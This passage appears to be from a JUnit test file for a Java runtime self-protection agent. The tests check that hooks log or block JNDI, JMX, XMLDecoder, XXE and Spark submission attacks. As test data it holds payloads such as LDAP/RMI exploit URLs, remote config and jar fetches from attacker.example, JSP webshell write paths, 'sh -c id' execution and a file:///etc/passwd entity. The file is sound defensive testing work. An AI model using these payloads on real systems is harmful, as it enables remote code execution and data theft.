    Path log = Files.createTempFile("ohmyrasp-java8-jaas-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Map<String, String> options = new HashMap<String, String>();
    options.put("principal", "app/localhost@EXAMPLE.COM");
    Java8RaspHooks.beforeJaasConfigEntry("com.sun.security.auth.module.Krb5LoginModule", options);

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJaasJndiRemoteProvider() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jaas-jndi", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Map<String, String> options = new HashMap<String, String>();
    options.put("user.provider.url", "ldap://java-chains:50389/x");
    Java8RaspHooks.beforeJaasConfigEntry("com.sun.security.auth.module.JndiLoginModule", options);

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jaas_jndi_remote_provider\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("ldap://java-chains:50389/x"));
  }

  @Test
  void blocksJaasJndiRemoteProviderWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jaas-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeJaasConfigEntry(
                "com.sun.security.auth.module.JndiLoginModule",
                "user.provider.url=\"rmi://127.0.0.1:1099/Exploit\" useFirstPass=true"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jaas_jndi_remote_provider\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("rmi://127.0.0.1:1099/Exploit"));
  }

  @Test
  void ignoresReadOnlyJmxRemoteUrlArgument() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jmx-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJmxMBeanInvoke(
        "example:type=Info", "getStatus", new Object[] {"http://example.com/status"});
    Java8RaspHooks.beforeJmxMBeanInvoke(
        "example:type=Logger", "setLogFile", new Object[] {"/var/log/app/current.log"});

    assertFalse(Files.exists(log));
  }

  @Test
  void logsJmxRemoteConfigSource() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jmx-remote", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeJmxMBeanInvoke(
        "org.apache.activemq:type=Broker,brokerName=localhost",
        "addNetworkConnector",
        new Object[] {"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"});

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jmx_remote_config_source\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("brokerConfig=xbean:http://attacker.example/poc.xml"));
  }

  @Test
  void blocksJmxScriptFileWriteWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-jmx-write-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeJmxMBeanInvoke(
                "jdk.management.jfr:type=FlightRecorder",
                "copyTo",
                new Object[] {"/opt/activemq/webapps/admin/shelljfr.jsp"}));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_jmx_script_file_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/opt/activemq/webapps/admin/shelljfr.jsp"));
  }

  @Test
  void ignoresJavaBeansStatementOutsideXmlDecoderStack() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xml-decoder-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Statement statement = new Statement(new ProcessBuilder("sh", "-c", "id"), "start", new Object[0]);
    Java8RaspHooks.beforeJavaBeansStatement(statement, Arrays.asList("app.BeanUtil"));

    assertFalse(Files.exists(log));
  }

  @Test
  void logsXmlDecoderRuntimeExecution() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xml-decoder-runtime", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Statement statement = new Statement(new ProcessBuilder("sh", "-c", "id"), "start", new Object[0]);
    Java8RaspHooks.beforeJavaBeansStatement(
        statement, Arrays.asList("java.beans.XMLDecoder", "com.sun.beans.decoder.DocumentHandler"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_xml_decoder_runtime_execution\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("java.lang.ProcessBuilder start sh -c id"));
  }

  @Test
  void blocksXmlDecoderScriptWriterWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xml-decoder-writer-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    Statement statement =
        new Statement(java.io.PrintWriter.class, "new", new Object[] {"/tmp/webapps/ROOT/shell.jsp"});

    assertThrows(
        Java8RaspBlockException.class,
        () ->
            Java8RaspHooks.beforeJavaBeansStatement(
                statement, Arrays.asList("java.beans.XMLDecoder")));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_xml_decoder_script_file_write\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("/tmp/webapps/ROOT/shell.jsp"));
  }

  @Test
  void ignoresNormalXmlEntitySource() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xxe-normal", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("catalina.home", "/usr/local/tomcat");
    System.setProperty("activemq.home", "/opt/activemq");

    Java8RaspHooks.beforeXmlEntity("[xml]", "");
    Java8RaspHooks.beforeXmlEntity("[xml]", "file:/usr/local/tomcat/conf/server.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/usr/local/tomcat/lib/tomcat-coyote.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/dubbo-sample-1.0-SNAPSHOT.jar!/org/apache/tomcat/util/modeler/mbeans-descriptors.dtd");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/opt/activemq/lib/web/jetty-jakarta-servlet-api-5.0.2.jar!/jakarta/servlet/resources/web-jsptaglibrary_1_2.dtd");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/root/.m2/repository/org/eclipse/jetty/toolchain/jetty-schemas/3.1.M0/jetty-schemas-3.1.M0.jar!/javax/servlet/jsp/resources/web-jsptaglibrary_1_2.dtd");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/root/.m2/repository/org/apache/struts/struts2-core/2.3.30/struts2-core-2.3.30.jar!/struts-default.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/struts2-config-browser-plugin-2.3.34.jar!/struts-plugin.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "jar:file:/u01/oracle/wlserver/modules/com.oracle.weblogic.security.service.store.jar!/com/bea/common/security/store/data/package.jdo");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "file:/usr/src/target/classes/struts.xml");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "file:/usr/src/target/classes/struts-actionchaining.xml");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts-chat.xml");
    com.opensymphony.xwork2.config.providers.XmlConfigurationProvider.parseLocalEntity(
        "[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/example.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]",
        "file:///usr/local/tomcat/org/apache/struts2/showcase/ajax/Example5Action-validation.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]", "file:///usr/src/com/opensymphony/xwork2/validator/validators/default.xml");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://www.eclipse.org/jetty/configure_9_0.dtd");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://www.eclipse.org/jetty/configure_9_3.dtd");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://java.sun.com/dtd/web-app_2_3.dtd");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://java.sun.com/dtd/web-facesconfig_1_1.dtd");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://mybatis.org/dtd/mybatis-3-config.dtd");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://mybatis.org/dtd/mybatis-3-mapper.dtd");
    Java8RaspHooks.beforeXmlEntity("[dtd]", "http://www.springframework.org/dtd/spring-beans.dtd");
    Java8RaspHooks.beforeXmlEntity("local", "classpath:application.xml");

    assertFalse(Files.exists(log));
  }

  @Test
  void logsXxeExternalEntityProtocol() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xxe-file", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());

    Java8RaspHooks.beforeXmlEntity("xxe", "file:///etc/passwd");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]", "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/example.xml");
    Java8RaspHooks.beforeXmlEntity(
        "[dtd]", "file:///tmp/org/apache/struts2/showcase/ajax/Example5Action-validation.xml");

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_xxe_external_entity_protocol\""));
    assertTrue(text.contains("\"action\":\"log\""));
    assertTrue(text.contains("xxe file:///etc/passwd"));
    assertTrue(
        text.contains("[dtd] file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/example.xml"));
    assertTrue(
        text.contains(
            "[dtd] file:///tmp/org/apache/struts2/showcase/ajax/Example5Action-validation.xml"));
  }

  @Test
  void blocksXxeExternalEntityProtocolWhenBlockModeIsEnabled() throws Exception {
    Path log = Files.createTempFile("ohmyrasp-java8-xxe-block", ".jsonl");
    Files.delete(log);
    System.setProperty("ohmyrasp.java8.log", log.toString());
    System.setProperty("ohmyrasp.java8.block", "true");

    assertThrows(
        Java8RaspBlockException.class,
        () -> Java8RaspHooks.beforeXmlEntity("xxe", "http://127.0.0.1:9/evil.dtd"));

    String text = new String(Files.readAllBytes(log), StandardCharsets.UTF_8);
    assertTrue(text.contains("\"algorithm\":\"java8_xxe_external_entity_protocol\""));
    assertTrue(text.contains("\"action\":\"block\""));
    assertTrue(text.contains("http://127.0.0.1:9/evil.dtd"));
  }

  static final class JaxRsRequestStub {
    private final String method;
    private final URI requestUri;
    private final Map<String, String> headers = new HashMap<String, String>();

    JaxRsRequestStub(String method, String requestUri) {
      this.method = method;
      this.requestUri = URI.create(requestUri);
    }

    public String getMethod() {
      return method;
    }

    public URI getRequestUri() {
      return requestUri;
    }

    public String getHeaderString(String name) {
      return headers.get(name);
    }

    JaxRsRequestStub withHeader(String name, String value) {
      headers.put(name, value);
      return this;
    }
  }

  static final class RequestStub {
    private final String method;
    private final String uri;
    private final String query;
    private final Object[] cookies;
    private final Map<String, String> headers = new HashMap<String, String>();
    private final Map<String, String[]> parameters = new HashMap<String, String[]>();
    private final Map<String, Object> attributes = new HashMap<String, Object>();

    RequestStub(String method, String uri, String query) {
      this(method, uri, query, new Object[0]);
    }

    RequestStub(String method, String uri, String query, Object... cookies) {
      this.method = method;
      this.uri = uri;
      this.query = query;
      this.cookies = cookies;
    }

    public String getMethod() {
      return method;
    }

    public String getRequestURI() {
      return uri;
    }

    public String getQueryString() {
      return query;
    }

    public Object[] getCookies() {
      return cookies;
    }

    public String getHeader(String name) {
      return headers.get(name);
    }

    public Map<String, String[]> getParameterMap() {
      return parameters;
    }

    public Object getAttribute(String name) {
      return attributes.get(name);
    }

    RequestStub withHeader(String name, String value) {
      headers.put(name, value);
      return this;
    }

    RequestStub withParameter(String name, String value) {
      parameters.put(name, new String[] {value});
      return this;
    }

    RequestStub withAttribute(String name, Object value) {
      attributes.put(name, value);
      return this;
    }
  }

  static final class ApplicationDispatcher {
    static void include(Object request) {
      Java8RaspHooks.beforeHttpRequest(request);
    }
  }

  static final class CookieStub {
    private final String name;
    private final String value;

    CookieStub(String name, String value) {
      this.name = name;
      this.value = value;
    }

    public String getName() {
      return name;
    }

    public String getValue() {
      return value;
    }
  }

  static final class FakeJexlExpression {
    private final String source;

    FakeJexlExpression(String source) {
      this.source = source;
    }

    public String getSourceText() {
      return source;
    }
  }

  static final class FakeElExpression {
    private final String source;

    FakeElExpression(String source) {
      this.source = source;
    }

    public String getExpressionString() {
      return source;
    }
  }

  private static String sparkRestSubmissionBody() {
    return "{"
        + "\"action\":\"CreateSubmissionRequest\","
        + "\"appResource\":\"http://attacker.example/payload.jar\","
        + "\"mainClass\":\"Exploit\","
        + "\"sparkProperties\":{\"spark.jars\":\"http://attacker.example/payload.jar\"}"
        + "}";
  }

  private static Object yarnSubmission(String command) {
    return new Java8YarnSubmissionProbe(Arrays.asList(command));
  }

  private static Map<String, Object> myBatisParameterMap(Object request) {
    Map<String, Object> values = new HashMap<>();
    values.put("request", request);
    return values;
  }

  static final class MyBatisQueryRequest {
    private final List<MyBatisOrder> orders;

    MyBatisQueryRequest(List<MyBatisOrder> orders) {
      this.orders = orders;
    }

    public List<MyBatisOrder> getOrders() {
      return orders;
    }
  }

  static final class MyBatisOrder {
    private final String name;
    private final String type;
    private final String prefix;

    MyBatisOrder(String name, String type, String prefix) {
      this.name = name;
      this.type = type;
      this.prefix = prefix;
    }

    public String getName() {
      return name;
    }

    public String getType() {
      return type;
    }

    public String getPrefix() {
      return prefix;
    }
  }

  private static byte[] classBytes(Class<?> type) throws Exception {
    String resourceName = type.getSimpleName() + ".class";
    try (InputStream input = type.getResourceAsStream(resourceName)) {
      if (input == null) {
        throw new IllegalStateException("Missing class resource " + resourceName);
      }
      ByteArrayOutputStream output = new ByteArrayOutputStream();
      byte[] buffer = new byte[4096];
      int count;
      while ((count = input.read(buffer)) >= 0) {
        output.write(buffer, 0, count);
      }
      return output.toByteArray();
    }
  }
}
